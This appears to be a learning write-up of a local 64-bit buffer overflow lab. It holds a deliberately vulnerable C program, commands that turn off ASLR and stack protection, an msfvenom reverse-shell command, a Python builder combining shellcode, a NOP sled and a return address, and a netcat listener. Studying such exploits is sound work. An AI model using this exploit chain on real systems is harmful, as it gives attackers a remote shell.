# some buffer overflow examples

references from https://bytesoverbombs.io/exploiting-a-64-bit-buffer-overflow-469e8b500f10

## bad code

bufferoverflow.c
```c
#include <stdio.h>
#include <unistd.h>
int vuln() {
    // Define variables
    char arr[400];
    int return_status;
    // Grab user input
    printf("What's your name?\n");
    return_status = read(0, arr, 800);
    // Print user input
    printf("Hey %s", arr);
    // Return success
    return 0;
}
int main(int argc, char *argv[]) {
    // Call vulnerable function
    vuln();
    // Return success
    return 0;
}
```

## compile
```shell
#randomize_va_space , when set to 1 or 2, turns on ASLR on our target sys-tem. By default, randomization is turned on in Ubuntu, but we need this feature off for our example. If the file includes the value 0, we’re all set. If not, change the file contents to 0 and save it.
echo 0 > /proc/sys/kernel/randomize_va_space
# -fno-stack-protector flag to turn off GCC’s stack-protection mechanism, which would attempt to prevent buffer overflows if we left it turned on. The -z execstack compiler option makes the stack executable, disabling another buffer overflow prevention method

#The -g option tells GCC to add extra debugging information for GDB 
gcc -g -fno-stack-protector -z execstack -o bufferoverflow bufferoverflow.c
```

## generate malicious code
```shell
msfvenom -p linux/x64/shell_reverse_tcp \ # Specify the payload
            LHOST=127.0.0.1             \ # Target host to connect
            LPORT=4444                  \ # Target port
         -b '\x00'                      \ # Bad characters
         -f python                        # Format of the payload
```
will to generat *buf* code
## payload

```python
# Payload generator
#!/usr/bin/python

## Total payload length
payload_length = 424
## Amount of nops
nop_length = 100
## Controlled memory address to return to in Little Endian format
## 0x7fffffffe2d0, this address was been foun through gdb. it's $rsp address
return_address = '\xd0\xe2\xff\xff\xff\x7f\x00\x00'
## Building the nop slide
nop_slide = "\x90" * nop_length


## Malicious code injection, generated by msfvenom
buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\x19\x1b\xa9\xe0\xc7\x3e\x20"
buf += "\x34\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\x73\x32\xf1\x79\xad\x3c\x7f\x5e\x18\x45\xa6\xe5\x8f"
buf += "\xa9\x68\x8d\x1b\x1b\xb8\xbc\x07\x96\x22\x4a\x48\x53"
buf += "\x20\x06\xad\x2e\x7a\x5e\x33\x43\xa6\xe5\xad\x3d\x7e"
buf += "\x7c\xe6\xd5\xc3\xc1\x9f\x31\x25\x41\xef\x71\x92\xb8"
buf += "\x5e\x76\x9b\x1b\x7b\x72\xc7\xcf\xb4\x56\x20\x67\x51"
buf += "\x92\x4e\xb2\x90\x76\xa9\xd2\x16\x1e\xa9\xe0\xc7\x3e"
buf += "\x20\x34"

## Building the padding between buffer overflow start and return address
padding = 'B' * (payload_length - nop_length - len(buf))

print nop_slide + buf + padding + return_address
```

## listening
```shell
nc -lvp 4444 &
```

## gdb debug
```shell
gdb bufferoverflow
```

![breakpoint](https://github.com/wangxi19/experiences/blob/master/bufferoverflow/image/breakpoint.png)

![beforexploiting](https://github.com/wangxi19/experiences/blob/master/bufferoverflow/image/beforexploiting.png)

![afterexploiting](https://github.com/wangxi19/experiences/blob/master/bufferoverflow/image/afterexploiting.png)
